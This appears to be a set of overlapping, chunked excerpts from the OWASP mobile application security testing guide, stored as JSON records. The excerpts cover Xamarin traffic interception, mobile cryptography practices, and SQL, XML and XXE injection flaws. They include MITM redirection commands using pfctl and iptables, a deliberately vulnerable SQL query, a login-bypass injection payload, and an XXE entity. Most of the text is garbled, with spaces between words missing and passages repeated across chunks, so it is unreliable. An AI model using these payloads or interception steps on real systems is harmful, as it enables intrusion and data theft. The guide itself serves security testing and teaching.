XamarinisamobileapplicationdevelopmentplatformthatiscapableofproducingnativeAndroidandiOSappsbyusing VisualStudioandC#asprogramminglanguage. WhentestingaXamarinappandwhenyouaretryingtosetthesystemproxyintheWi-Fisettingsyouwon’tbeableto seeanyHTTPrequestsinyourinterceptionproxy,astheappscreatedbyXamarindonotusethelocalproxysettingsof yourphone. Therearethreewaystoresolvethis: • 1stway: Addadefaultproxytotheapp,byaddingthefollowingcodeintheOnCreateorMainmethodandre-create theapp: WebRequest.DefaultWebProxy =newWebProxy(\"192.168.11.1\",8080); • 2ndway: Usebettercapinordertogetaman-in-the-middleposition(MITM),seethesectionaboveabouthowto setupaMITMattack. WhenbeingMITMyouonlyneedtoredirectport443toyourinterceptionproxyrunningon localhost. ThiscanbedonebyusingthecommandrdronmacOS: 68\\n$echo \" rdrpass inetprototcpfromanytoanyport443->127.0.0.1port8080 \"|sudo pfctl -ef- ForLinuxsystemsyoucanuseiptables: sudo iptables -tnat-APREROUTING -ptcp--dport 443-jDNAT --to-destination 127.0.0.1:8080 Aslaststep,youneedtosettheoption‘Supportinvisibleproxy’inthelistenersettingsofBurpSuite. • 3rdway: Insteadofbettercapanalternativeistweakingthe/etc/hostsonthemobilephone. Addanentryinto /etc/hostsforthetargetdomainandpointittotheIPaddressofyourinterceptingproxy. Thiscreatesasimilar situation of being MITM as with bettercap and you need to redirect port 443 to the port which is used by your interceptionproxy. The redirectioncan be applied as mentioned above. Additionally, you need to redirecttraffic fromyourinterceptionproxytotheoriginallocationandport. When redirecting traffic you should create narrow rules to the domains and IPs in scope, to minimize noise and out-of-scopetraffic. Theinterceptionproxyneedtolistentotheportspecifiedintheportforwardingruleabove,whichis8080. WhenaXamarinappisconfiguredtouseaproxy(e.g.byusingWebRequest.DefaultWebProxy)youneedtospecifywhere trafficshouldgonext,afterredirectingthetraffictoyourinterceptingproxy. Youneedtoredirectthetraffictotheoriginal location. ThefollowingprocedureissettinguparedirectioninBurptotheoriginallocation: 1. GotoProxytabandclickonOptions 2. Selectandedityourlistenerfromthelistofproxylisteners. 3. GotoRequesthandlingtabandset: • Redirecttohost: provideoriginaltrafficlocation. • Redirecttoport: provideoriginalportlocation. • Set‘ForceuseofSSL’(whenHTTPSisused)andset‘Supportinvisibleproxy’. 69\\nCA Certificates Ifnotalreadydone,installtheCAcertificatesinyourmobiledevicewhichwillallowustointerceptHTTPSrequests: • InstalltheCAcertificateofyourinterceptionproxyintoyourAndroidphone>NotethatstartingwithAndroid7.0 (API level 24)",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 48
    }
  },
  {
    "text": "redirecttraffic fromyourinterceptionproxytotheoriginallocationandport. When redirecting traffic you should create narrow rules to the domains and IPs in scope, to minimize noise and out-of-scopetraffic. Theinterceptionproxyneedtolistentotheportspecifiedintheportforwardingruleabove,whichis8080. WhenaXamarinappisconfiguredtouseaproxy(e.g.byusingWebRequest.DefaultWebProxy)youneedtospecifywhere trafficshouldgonext,afterredirectingthetraffictoyourinterceptingproxy. Youneedtoredirectthetraffictotheoriginal location. ThefollowingprocedureissettinguparedirectioninBurptotheoriginallocation: 1. GotoProxytabandclickonOptions 2. Selectandedityourlistenerfromthelistofproxylisteners. 3. GotoRequesthandlingtabandset: • Redirecttohost: provideoriginaltrafficlocation. • Redirecttoport: provideoriginalportlocation. • Set‘ForceuseofSSL’(whenHTTPSisused)andset‘Supportinvisibleproxy’. 69\\nCA Certificates Ifnotalreadydone,installtheCAcertificatesinyourmobiledevicewhichwillallowustointerceptHTTPSrequests: • InstalltheCAcertificateofyourinterceptionproxyintoyourAndroidphone>NotethatstartingwithAndroid7.0 (API level 24) the OS no longer trusts a user supplied CA certificate unless specified in the app. Bypassing this securitymeasurewillbeaddressedinthe“BasicSecurityTesting”chapters. • InstalltheCAcertificateofyourinterceptionproxyintoyouriOSphone Intercepting Traffic Startusingtheappandtriggeritsfunctions. YoushouldseeHTTPmessagesshowingupinyourinterceptionproxy. Whenusingbettercapyouneedtoactivate“Supportinvisibleproxying”inProxyTab/Options/EditInterface 70\\nMobile App Cryptography Cryptographyplaysanespeciallyimportantroleinsecuringtheuser’sdata-evenmoresoinamobileenvironment,where attackershavingphysicalaccesstotheuser’sdeviceisalikelyscenario. Thischapterprovidesanoutlineofcryptographic conceptsandbestpracticesrelevanttomobileapps. Thesebestpracticesarevalidindependentofthemobileoperating system. Key Concepts The goal of cryptography is to provide constant confidentiality, data integrity, and authenticity, even in the face of an attack. Confidentiality involves ensuring data privacy through the use of encryption. Data integrity deals with data consistencyanddetectionoftamperingandmodificationofdatathroughtheuseofhashing. Authenticityensuresthat thedatacomesfromatrustedsource. Encryptionalgorithmsconvertsplaintextdataintociphertextthatconcealstheoriginalcontent. Plaintextdatacanbe restoredfromtheciphertextthroughdecryption. Encryptioncanbesymmetric(encryption/decryptionwithsamesecret- key)orasymmetric(encryption/decryptionusingapublicandprivatekeypair). Ingeneral,encryptionoperationsdonot protectintegrity,butsomesymmetricencryptionmodesalsofeaturethatprotection. Symmetric-keyencryptionalgorithmsusethesamekeyforbothencryptionanddecryption. Thistypeofencryption isfastandsuitableforbulkdataprocessing. Sinceeverybodywhohasaccesstothekeyisabletodecrypttheencrypted content,thismethodrequirescarefulkeymanagementandcentralizedcontroloverkeydistribution. Public-keyencryptionalgorithmsoperatewithtwoseparatekeys: thepublickeyandtheprivatekey. Thepublickey can be distributed freely while the private key shouldn’t be shared with anyone. A message encrypted with the public key can only be decrypted with the private key and vice-versa. Since asymmetric encryption is several times slower than symmetric operations, it’s typically only used to encrypt small amounts of data, such as symmetric keys for bulk encryption. Hashingisn’taformofencryption,butitdoesusecryptography. Hashfunctionsdeterministicallymaparbitrarypiecesof dataintofixed-lengthvalues. It’seasytocomputethehashfromtheinput,butverydifficult(i.e.infeasible)todetermine theoriginalinputfromthehash. Additionally,thehashwillcompletelychangewhenevenasinglebitoftheinputchanges. Hashfunctionsareusedforintegrityverification,butdon’tprovideanauthenticityguarantee. Message Authentication Codes(MACs)combineothercryptographicmechanisms(suchassymmetricencryptionor hashes)withsecretkeystoprovidebothintegrityandauthenticityprotection. However,inordertoverifyaMAC,multiple entitieshavetosharethesamesecretkeyandanyofthoseentitiescangenerateavalidMAC.HMACs,themostcommonly usedtypeofMAC,relyonhashingastheunderlyingcryptographicprimitive. ThefullnameofanHMACalgorithmusually includestheunderlyinghashfunction’stype(forexample,HMAC-SHA256usestheSHA-256hashfunction). Signaturescombineasymmetriccryptography(thatis,usingapublic/privatekeypair)withhashingtoprovideintegrity and authenticity by encrypting the hash of the message with the private key. However, unlike MACs, signatures also providenon-repudiationpropertyastheprivatekeyshouldremainuniquetothedatasigner. Key Derivation Functions (KDFs) derive secret keys from a secret value (such as a password) and are used to turn keys into other formats or to increase their length. KDFs are similar to hashing functions but have other uses as well (forexample,theyareusedascomponentsofmulti-partykey-agreementprotocols). Whilebothhashingfunctionsand KDFs must be difficult to reverse, KDFs have the added requirement that the keys they produce must have a level of randomness. Identifying Insecure and/or Deprecated Cryptographic Algorithms When assessing a mobile app, you should make sure that it does not use cryptographic algorithms and protocols that havesignificantknownweaknessesorareotherwiseinsufficientformodernsecurityrequirements. Algorithmsthatwere consideredsecureinthepastmaybecomeinsecureovertime;therefore,it’simportanttoperiodicallycheckcurrentbest practicesandadjustconfigurationsaccordingly. Verifythatcryptographicalgorithmsareuptodateandin-linewithindustrystandards. Vulnerablealgorithmsincludeout- datedblockciphers(suchasDESand3DES),streamciphers(suchasRC4),hashfunctions(suchasMD5andSHA1),and brokenrandomnumbergenerators(suchasDual_EC_DRBGandSHA1PRNG).Notethatevenalgorithmsthatarecertified 71\\n(forexample, byNIST)canbecomeinsecureovertime. Acertificationdoesnotreplaceperiodicverificationofanalgo- rithm’ssoundness. Algorithmswithknownweaknessesshouldbereplacedwithmoresecurealternatives. Additionally, algorithms used for encryption must be standardized and open to verification. Encrypting data using any unknown, or proprietaryalgorithmsmayexposetheapplicationtodifferentcryptographicattackswhichmayresultinrecoveryofthe plaintext. Inspecttheapp’ssourcecodetoidentifyinstancesofcryptographicalgorithmsthatareknowntobeweak,suchas: • DES,3DES • RC2 • RC4 • BLOWFISH • MD4 • MD5 • SHA1 ThenamesofcryptographicAPIsdependontheparticularmobileplatform. Pleasemakesurethat: • Cryptographic algorithms are up to date and in-line with industry standards. This includes, but is not limited to outdated block ciphers (e.g. DES), stream ciphers (e.g. RC4), as well as hash functions (e.g. MD5) and broken randomnumbergeneratorslikeDual_EC_DRBG(eveniftheyareNISTcertified). Alloftheseshouldbemarkedas insecureandshouldnotbeusedandremovedfromtheapplicationandserver. • Keylengthsarein-linewithindustrystandardsandprovideprotectionforsufficientamountoftime. Acomparison ofdifferentkeylengthsandprotectiontheyprovidetakingintoaccountMoore’slawisavailableonline. • Cryptographicmeansarenotmixedwitheachother: e.g.youdonotsignwithapublickey,ortrytoreuseakey pairusedforasignaturetodoencryption. • Cryptographic parameters are well defined within reasonable range. This includes, but is not limited to: cryp- tographicsalt, whichshouldbeatleastthesamelengthashashfunctionoutput, reasonablechoiceofpassword derivationfunctionanditerationcount(e.g.PBKDF2,scryptorbcrypt),IVsbeingrandomandunique,fit-for-purpose blockencryptionmodes(e.g.ECBshouldnotbeused,exceptspecificcases),keymanagementbeingdoneproperly (e.g.3DESshouldhavethreeindependentkeys)andsoon. Thefollowingalgorithmsarerecommended: • Confidentialityalgorithms: AES-GCM-256orChaCha20-Poly1305 • Integrityalgorithms: SHA-256,SHA-384,SHA-512,BLAKE3,theSHA-3family • Digitalsignaturealgorithms: RSA(3072bitsandhigher),ECDSAwithNISTP-384 • Keyestablishmentalgorithms: RSA(3072bitsandhigher),DH(3072bitsorhigher),ECDHwithNISTP-384 Additionally,youshouldalwaysrelyonsecurehardware(ifavailable)forstoringencryptionkeys,performingcryptographic operations,etc. Formoreinformationonalgorithmchoiceandbestpractices,seethefollowingresources: • “CommercialNationalSecurityAlgorithmSuiteandQuantumComputingFAQ” • NISTrecommendations(2019) • BSIrecommendations(2019) Common Configuration Issues Insufficient Key Length Eventhemostsecureencryptionalgorithmbecomesvulnerabletobrute-forceattackswhenthatalgorithmusesaninsuf- ficientkeysize. Ensurethatthekeylengthfulfillsacceptedindustrystandards. 72\\nSymmetric Encryption with Hard-Coded Cryptographic Keys Thesecurityofsymmetricencryptionandkeyedhashes(MACs)dependsonthesecrecyofthekey. Ifthekeyisdisclosed, the security gained by encryption is lost. To prevent this, never store secret keys in the same place",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 49
    }
  },
  {
    "text": "• Digitalsignaturealgorithms: RSA(3072bitsandhigher),ECDSAwithNISTP-384 • Keyestablishmentalgorithms: RSA(3072bitsandhigher),DH(3072bitsorhigher),ECDHwithNISTP-384 Additionally,youshouldalwaysrelyonsecurehardware(ifavailable)forstoringencryptionkeys,performingcryptographic operations,etc. Formoreinformationonalgorithmchoiceandbestpractices,seethefollowingresources: • “CommercialNationalSecurityAlgorithmSuiteandQuantumComputingFAQ” • NISTrecommendations(2019) • BSIrecommendations(2019) Common Configuration Issues Insufficient Key Length Eventhemostsecureencryptionalgorithmbecomesvulnerabletobrute-forceattackswhenthatalgorithmusesaninsuf- ficientkeysize. Ensurethatthekeylengthfulfillsacceptedindustrystandards. 72\\nSymmetric Encryption with Hard-Coded Cryptographic Keys Thesecurityofsymmetricencryptionandkeyedhashes(MACs)dependsonthesecrecyofthekey. Ifthekeyisdisclosed, the security gained by encryption is lost. To prevent this, never store secret keys in the same place as the encrypted datatheyhelpedcreate. Acommonmistakeisencryptinglocallystoreddatawithastatic,hardcodedencryptionkeyand compilingthatkeyintotheapp. Thismakesthekeyaccessibletoanyonewhocanuseadisassembler. Hardcodedencryptionkeymeansthatakeyis: • partofapplicationresources • valuewhichcanbederivedfromknownvalues • hardcodedincode First, ensure that no keys or passwords are stored within the source code. This means you should check native code, JavaScript/Dartcode,Java/KotlincodeonAndroidandObjective-C/SwiftiniOS.Notethathard-codedkeysareproblematic evenifthesourcecodeisobfuscatedsinceobfuscationiseasilybypassedbydynamicinstrumentation. Iftheappisusingtwo-wayTLS(bothserverandclientcertificatesarevalidated),makesurethat: • Thepasswordtotheclientcertificateisn’tstoredlocallyorislockedinthedeviceKeychain. • Theclientcertificateisn’tsharedamongallinstallations. Iftheappreliesonanadditionalencryptedcontainerstoredinappdata,checkhowtheencryptionkeyisused. Ifakey- wrappingschemeisused,ensurethatthemastersecretisinitializedforeachuserorthecontainerisre-encryptedwith newkey. Ifyoucanusethemastersecretorpreviouspasswordtodecryptthecontainer,checkhowpasswordchanges arehandled. Secretkeysmustbestoredinsecuredevicestoragewheneversymmetriccryptographyisusedinmobileapps. Formore informationontheplatform-specificAPIs,seethe“DataStorageonAndroid”and“DataStorageoniOS”chapters. Weak Key Generation Functions Cryptographicalgorithms(suchassymmetricencryptionorsomeMACs)expectasecretinputofagivensize. Forexample, AESusesakeyofexactly16bytes. Anativeimplementationmightusetheuser-suppliedpassworddirectlyasaninput key. Usingauser-suppliedpasswordasaninputkeyhasthefollowingproblems: • Ifthepasswordissmallerthanthekey,thefullkeyspaceisn’tused. Theremainingspaceispadded(spacesare sometimesusedforpadding). • Auser-suppliedpasswordwillrealisticallyconsistmostlyofdisplayableandpronounceablecharacters. Therefore, onlysomeofthepossible256ASCIIcharactersareusedandentropyisdecreasedbyapproximatelyafactoroffour. Ensurethatpasswordsaren’tdirectlypassedintoanencryptionfunction. Instead,theuser-suppliedpasswordshouldbe passedintoaKDFtocreateacryptographickey. Chooseanappropriateiterationcountwhenusingpasswordderivation functions. Forexample,NISTrecommendsaniterationcountofatleast10,000forPBKDF2andforcriticalkeyswhereuser- perceivedperformanceisnotcriticalatleast10,000,000. Forcriticalkeys,itisrecommendedtoconsiderimplementation ofalgorithmsrecognizedbyPasswordHashingCompetition(PHC)likeArgon2. Weak Random Number Generators It is fundamentally impossible to produce truly random numbers on any deterministic device. Pseudo-random number generators (RNG) compensate for this by producing a stream of pseudo-random numbers - a stream of numbers that appear as if they were randomly generated. The quality of the generated numbers varies with the type of algorithm used. CryptographicallysecureRNGsgeneraterandomnumbersthatpassstatisticalrandomnesstests,andareresilient againstpredictionattacks(e.g.itisstatisticallyinfeasibletopredictthenextnumberproduced). MobileSDKsofferstandardimplementationsofRNGalgorithmsthatproducenumberswithsufficientartificialrandomness. We’llintroducetheavailableAPIsintheAndroidandiOSspecificsections. 73\\nCustom Implementations of Cryptography Inventing proprietary cryptographic functions is time consuming, difficult, and likely to fail. Instead, we can use well- knownalgorithmsthatarewidelyregardedassecure. MobileoperatingsystemsofferstandardcryptographicAPIsthat implementthosealgorithms. Carefullyinspectallthecryptographicmethodsusedwithinthesourcecode,especiallythosethataredirectlyappliedto sensitivedata. AllcryptographicoperationsshouldusestandardcryptographicAPIsforAndroidandiOS(we’llwriteabout thoseinmoredetailintheplatform-specificchapters). Anycryptographicoperationsthatdon’tinvokestandardroutines from known providers should be closely inspected. Pay close attention to standard algorithms that have been modi- fied. Rememberthatencodingisn’tthesameasencryption! Alwaysinvestigatefurtherwhenyoufindbitmanipulation operatorslikeXOR(exclusiveOR). Atallimplementationsofcryptography,youneedtoensurethatthefollowingalwaystakesplace: • Worker keys (like intermediary/derived keys in AES/DES/Rijndael) are properly removed from memory after con- sumptionorincaseoferror. • Theinnerstateofaciphershouldberemovedfrommemoryassoonaspossible. Inadequate AES Configuration Advanced Encryption Standard (AES) is the widely accepted standard for symmetric encryption in mobile apps. It’s an iterative block cipher that is based on a series of linked mathematical operations. AES performs a variable number of roundsontheinput,eachofwhichinvolvesubstitutionandpermutationofthebytesintheinputblock. Eachrounduses a128-bitroundkeywhichisderivedfromtheoriginalAESkey. Asofthiswriting,noefficientcryptanalyticattacksagainstAEShavebeendiscovered. However,implementationdetails andconfigurableparameterssuchastheblockciphermodeleavesomemarginforerror. Weak Block Cipher Mode Block-basedencryptionisperformedupondiscreteinputblocks(forexample,AEShas128-bitblocks). Iftheplaintextis largerthantheblocksize,theplaintextisinternallysplitupintoblocksofthegiveninputsizeandencryptionisperformed oneachblock. Ablockciphermodeofoperation(orblockmode)determinesiftheresultofencryptingthepreviousblock impactssubsequentblocks. ECB(ElectronicCodebook)dividestheinputintofixed-sizeblocksthatareencryptedseparatelyusingthesamekey. If multipledividedblockscontainthesameplaintext, theywillbeencryptedintoidenticalciphertextblockswhichmakes patternsindataeasiertoidentify. Insomesituations,anattackermightalsobeabletoreplaytheencrypteddata. VerifythatCipherBlockChaining(CBC)modeisusedinsteadofECB.InCBCmode,plaintextblocksareXORedwiththe previousciphertextblock. Thisensuresthateachencryptedblockisuniqueandrandomizedevenifblockscontainthe sameinformation. PleasenotethatitisbesttocombineCBCwithanHMACand/orensurethatnoerrorsaregivensuch as“Paddingerror”,“MACerror”,“decryptionfailed”inordertobemoreresistanttoapaddingoracleattack. 74\\nWhenstoringencrypteddata,werecommendusingablockmodethatalsoprotectstheintegrityofthestoreddata,such as Galois/Counter Mode (GCM). The latter has the additional benefit that the algorithm is mandatory for each TLSv1.2 implementation,andthusisavailableonallmodernplatforms. Formoreinformationoneffectiveblockmodes,seetheNISTguidelinesonblockmodeselection. Predictable Initialization Vector CBC,OFB,CFB,PCBC,GCMmoderequireaninitializationvector(IV)asaninitialinputtothecipher. TheIVdoesn’thave tobekeptsecret,butitshouldn’tbepredictable: itshouldberandomandunique/non-repeatableforeachencryptedmes- sage. MakesurethatIVsaregeneratedusingacryptographicallysecurerandomnumbergenerator. Formoreinformation onIVs,seeCryptoFail’sinitializationvectorsarticle. Pay attention to cryptographic libraries used in the code: many open source libraries provide examples in their docu- mentationsthatmightfollowbadpractices(e.g.usingahardcodedIV).Apopularmistakeiscopy-pastingexamplecode withoutchangingtheIVvalue. Initialization Vectors in stateful operation modes Please note that the usage of IVs is different when using CTR and GCM mode in which the initialization vector is often acounter(inCTRcombinedwithanonce). SohereusingapredictableIVwithitsownstatefulmodelisexactlywhatis needed. InCTRyouhaveanewnoncepluscounterasaninputtoeverynewblockoperation. Forexample: fora5120 bitlongplaintext: youhave20blocks,soyouneed20inputvectorsconsistingofanonceandcounter. WhereasinGCM youhaveasingleIVpercryptographicoperation,whichshouldnotberepeatedwiththesamekey. Seesection8ofthe documentationfromNISTonGCMformoredetailsandrecommendationsoftheIV. Padding Oracle Attacks due to Weaker Padding or Block Operation Implementations In the old days, PKCS1.5 padding (in code: PKCS1Padding) was used as a padding mechanism when doing asymmet- ric encryption. This mechanism is vulnerable to the padding oracle attack. Therefore, it is best to use OAEP (Optimal Asymmetric Encryption Padding) captured in PKCS#1 v2.0 (in code: OAEPPadding, OAEPwithSHA-256andMGF1Padding, OAEPwithSHA-224andMGF1Padding, OAEPwithSHA-384andMGF1Padding, OAEPwithSHA-512andMGF1Padding). Note that, even when using OAEP, you can still run into an issue known best as the Manger’s attack as described in",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 50
    }
  },
  {
    "text": "vulnerable to the padding oracle attack. Therefore, it is best to use OAEP (Optimal Asymmetric Encryption Padding) captured in PKCS#1 v2.0 (in code: OAEPPadding, OAEPwithSHA-256andMGF1Padding, OAEPwithSHA-224andMGF1Padding, OAEPwithSHA-384andMGF1Padding, OAEPwithSHA-512andMGF1Padding). Note that, even when using OAEP, you can still run into an issue known best as the Manger’s attack as described in the blog at Kudelskisecurity. Note: AES-CBCwithPKCS#5hasshowntobevulnerabletopaddingoracleattacksaswell,giventhattheimplementation giveswarnings,suchas“Paddingerror”,“MACerror”,or“decryptionfailed”. SeeThePaddingOracleAttackandTheCBC PaddingOracleProblemforanexample. Next,itisbesttoensurethatyouaddanHMACafteryouencrypttheplaintext: afterallaciphertextwithafailingMACwillnothavetobedecryptedandcanbediscarded. Protecting Keys in Storage and in Memory When memory dumping is part of your threat model, then keys can be accessed the moment they are actively used. Memorydumpingeitherrequiresroot-access(e.g.arooteddeviceorjailbrokendevice)oritrequiresapatchedapplication withFrida(soyoucanusetoolslikeFridump). Thereforeitisbesttoconsiderthefollowing,ifkeysarestillneededatthe device: • KeysinaRemoteServer: youcanuseremoteKeyvaultssuchasAmazonKMSorAzureKeyVault. Forsomeuse cases,developinganorchestrationlayerbetweentheappandtheremoteresourcemightbeasuitableoption. For instance,aserverlessfunctionrunningonaFunctionasaService(FaaS)system(e.g.AWSLambdaorGoogleCloud Functions)whichforwardsrequeststoretrieveanAPIkeyorsecret. ThereareotheralternativessuchasAmazon Cognito,GoogleIdentityPlatformorAzureActiveDirectory. • Keys inside Secure Hardware-backed Storage: make sure that all cryptographic actions and the key itself remainintheTrustedExecutionEnvironment(e.g.useAndroidKeystore)orSecureEnclave(e.g.usetheKeychain). RefertotheAndroidDataStorageandiOSDataStoragechaptersformoreinformation. • KeysprotectedbyEnvelopeEncryption: IfkeysarestoredoutsideoftheTEE/SE,considerusingmulti-layered encryption: anenvelopeencryptionapproach(seeOWASPCryptographicStorageCheatSheet,GoogleCloudKey managementguide,AWSWell-ArchitectedFrameworkguide),oraHPKEapproachtoencryptdataencryptionkeys withkeyencryptionkeys. 75\\n• KeysinMemory: makesurethatkeysliveinmemoryfortheshortesttimepossibleandconsiderzeroingoutand nullifyingkeysaftersuccessfulcryptographicoperations,andincaseoferror. Forgeneralcryptocodingguidelines, refertoCleanmemoryofsecretdata. Note: giventheeaseofmemorydumping,neversharethesamekeyamongaccountsand/ordevices,otherthanpublic keysusedforsignatureverificationorencryption. Protecting Keys in Transport Whenkeysneedtobetransportedfromonedevicetoanother,orfromtheapptoabackend,makesurethatproperkey protectionisinplace,bymeansofatransportkeypairoranothermechanism. Often,keysaresharedwithobfuscation methods which can be easily reversed. Instead, make sure asymmetric cryptography or wrapping keys are used. For example,asymmetrickeycanbeencryptedwiththepublickeyfromanasymmetrickeypair. Cryptographic APIs on Android and iOS WhilesamebasiccryptographicprinciplesapplyindependentoftheparticularOS,eachoperatingsystemoffersitsown implementationandAPIs. Platform-specificcryptographicAPIsfordatastoragearecoveredingreaterdetailinthe“Data StorageonAndroid”and“TestingDataStorageoniOS”chapters. Encryptionofnetworktraffic,especiallyTransportLayer Security(TLS),iscoveredinthe“AndroidNetworkAPIs”chapter. Cryptographic Policy Inlargerorganizations,orwhenhigh-riskapplicationsarecreated,itcanoftenbeagoodpracticetohaveacryptographic policy, based on frameworks such as NIST Recommendation for Key Management. When basic errors are found in the applicationofcryptography,itcanbeagoodstartingpointofsettingupalessonslearned/cryptographickeymanagement policy. Cryptography Regulations WhenyouuploadtheapptotheAppStoreorGooglePlay,yourapplicationistypicallystoredonaUSserver. Ifyourapp containscryptographyandisdistributedtoanyothercountry,itisconsideredacryptographyexport. Itmeansthatyou needtofollowUSexportregulationsforcryptography. Also,somecountrieshaveimportregulationsforcryptography. Learnmore: • ComplyingwithEncryptionExportRegulations(Apple) • Exportcomplianceoverview(Apple) • Exportcompliance(Google) • EncryptionandExportAdministrationRegulations(USA) • EncryptionControl(France) • Worldmapofencryptionlawsandpolicies 76\\nMobile App Code Quality Mobileappdevelopersuseawidevarietyofprogramminglanguagesandframeworks. Assuch,commonvulnerabilities such as SQL injection, buffer overflows, and cross-site scripting (XSS), may manifest in apps when neglecting secure programmingpractices. The same programming flaws may affect both Android and iOS apps to some degree, so we’ll provide an overview of the most common vulnerability classes frequently in the general section of the guide. In later sections, we will cover OS-specificinstancesandexploitmitigationfeatures. Injection Flaws Aninjectionflawdescribesaclassofsecurityvulnerabilityoccurringwhenuserinputisinsertedintobackendqueriesor commands. By injecting meta-characters, an attacker can execute malicious code that is inadvertently interpreted as partofthecommandorquery. Forexample,bymanipulatingaSQLquery,anattackercouldretrievearbitrarydatabase recordsormanipulatethecontentofthebackenddatabase. Vulnerabilitiesofthisclassaremostprevalentinserver-sidewebservices. Exploitableinstancesalsoexistwithinmobile apps,butoccurrencesarelesscommon,plustheattacksurfaceissmaller. Forexample,whileanappmightqueryalocalSQLitedatabase,suchdatabasesusuallydonotstoresensitivedata(assum- ingthedeveloperfollowedbasicsecuritypractices). ThismakesSQLinjectionanon-viableattackvector. Nevertheless, exploitable injection vulnerabilities sometimes occur, meaning proper input validation is a necessary best practice for programmers. SQL Injection A SQL injection attack involves integrating SQL commands into input data, mimicking the syntax of a predefined SQL command. A successful SQL injection attack allows the attacker to read or write to the database and possibly execute administrativecommands,dependingonthepermissionsgrantedbytheserver. AppsonbothAndroidandiOSuseSQLitedatabasesasameanstocontrolandorganizelocaldatastorage. Assumean Android app handles local user authentication by storing the user credentials in a local database (a poor programming practicewe’lloverlookforthesakeofthisexample). Uponlogin,theappqueriesthedatabasetosearchforarecordwith theusernameandpasswordenteredbytheuser: SQLiteDatabasedb; Stringsql =\"SELECT*FROMusersWHEREusername='\" + username +\"'ANDpassword='\" +password +\"'\"; Cursorc =db.rawQuery(sql,null ); return c.getCount()!=0; Let’sfurtherassumeanattackerentersthefollowingvaluesintothe“username”and“password”fields: username =1'or'1'='1 password =1'or'1'='1 Thisresultsinthefollowingquery: SELECT *FROM users WHERE username='1'OR'1'='1'ANDPassword='1'OR'1'= '1' Becausethecondition'1'='1'alwaysevaluatesastrue,thisqueryreturnallrecordsinthedatabase,causingthelogin functiontoreturntrueeventhoughnovaliduseraccountwasentered. OstorlabexploitedthesortparameterofYahoo’sweathermobileapplicationwithadbusingthisSQLinjectionpayload. Another real-world instance of client-side SQL injection was discovered by Mark Woods within the “Qnotes” and “Qget” AndroidappsrunningonQNAPNASstorageappliances. TheseappsexportedcontentprovidersvulnerabletoSQLinjection, allowinganattackertoretrievethecredentialsfortheNASdevice. Adetaileddescriptionofthisissuecanbefoundon theNettitudeBlog. 77\\nXML Injection InaXMLinjectionattack,theattackerinjectsXMLmeta-characterstostructurallyalterXMLcontent. Thiscanbeusedto eithercompromisethelogicofanXML-basedapplicationorservice,aswellaspossiblyallowanattackertoexploitthe operationoftheXMLparserprocessingthecontent. ApopularvariantofthisattackisXMLeXternalEntity(XXE).Here, anattackerinjectsanexternalentitydefinitioncon- taininganURIintotheinputXML.Duringparsing,theXMLparserexpandstheattacker-definedentitybyaccessingthe resourcespecifiedbytheURI.Theintegrityoftheparsingapplicationultimatelydeterminescapabilitiesaffordedtothe attacker, wherethemalicioususer coulddoany(orall) ofthefollowing: accesslocalfiles, triggerHTTPrequeststoar- bitraryhostsandports, launchacross-siterequestforgery(CSRF)attack, andcauseadenial-of-servicecondition. The OWASPwebtestingguidecontainsthefollowingexampleforXXE: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo[ <!ELEMENT fooANY> <!ENTITY xxeSYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo> Inthisexample,thelocalfile/dev/randomisopenedwhereanendlessstreamofbytesisreturned,potentiallycausinga denial-of-service. The current trend in app development focuses mostly on REST/JSON-based services as XML is becoming less common. However,intherarecaseswhereuser-suppliedorotherwiseuntrustedcontentisusedtoconstructXMLqueries,itcould be interpreted by local XML parsers, such as NSXMLParser on",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 51
    }
  },
  {
    "text": "coulddoany(orall) ofthefollowing: accesslocalfiles, triggerHTTPrequeststoar- bitraryhostsandports, launchacross-siterequestforgery(CSRF)attack, andcauseadenial-of-servicecondition. The OWASPwebtestingguidecontainsthefollowingexampleforXXE: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo[ <!ELEMENT fooANY> <!ENTITY xxeSYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo> Inthisexample,thelocalfile/dev/randomisopenedwhereanendlessstreamofbytesisreturned,potentiallycausinga denial-of-service. The current trend in app development focuses mostly on REST/JSON-based services as XML is becoming less common. However,intherarecaseswhereuser-suppliedorotherwiseuntrustedcontentisusedtoconstructXMLqueries,itcould be interpreted by local XML parsers, such as NSXMLParser on iOS. As such, said input should always be validated and meta-charactersshouldbeescaped. Injection Attack Vectors Theattacksurfaceofmobileappsisquitedifferentfromtypicalwebandnetworkapplications. Mobileappsdon’toften exposeservicesonthenetwork,andviableattackvectorsonanapp’suserinterfacearerare. Injectionattacksagainstan apparemostlikelytooccurthroughinter-processcommunication(IPC)interfaces,whereamaliciousappattacksanother apprunningonthedevice. Locatingapotentialvulnerabilitybeginsbyeither: • Identifying possible entry points for untrusted input then tracing from those locations to see if the destination containspotentiallyvulnerablefunctions. • Identifying known, dangerous library / API calls (e.g. SQL queries) and then checking whether unchecked input successfullyinterfaceswithrespectivequeries. Duringamanualsecurityreview,youshouldemployacombinationofbothtechniques. Ingeneral,untrustedinputsenter mobileappsthroughthefollowingchannels: • IPCcalls • CustomURLschemes • QRcodes • InputfilesreceivedviaBluetooth,NFC,orothermeans • Pasteboards • Userinterface Verifythatthefollowingbestpracticeshavebeenfollowed: • Untrustedinputsaretype-checkedand/orvalidatedusingalistofacceptablevalues. • Preparedstatementswithvariablebinding(i.e.parameterizedqueries)areusedwhenperformingdatabasequeries. Ifpreparedstatementsaredefined,user-supplieddataandSQLcodeareautomaticallyseparated. • WhenparsingXMLdata,ensuretheparserapplicationisconfiguredtorejectresolutionofexternalentitiesinorder topreventXXEattack. • When working with x509 formatted certificate data, ensure that secure parsers are used. For instance Bouncy Castlebelowversion1.6allowsforRemoteCodeExecutionbymeansofunsafereflection. WewillcoverdetailsrelatedtoinputsourcesandpotentiallyvulnerableAPIsforeachmobileOSintheOS-specifictesting guides. 78\\nCross-Site Scripting Flaws Cross-site scripting (XSS) issues allow attackers to inject client-side scripts into web pages viewed by users. This type ofvulnerabilityisprevalentinwebapplications. Whenauserviewstheinjectedscriptinabrowser, theattackergains theabilitytobypassthesameoriginpolicy,enablingawidevarietyofexploits(e.g.stealingsessioncookies,loggingkey 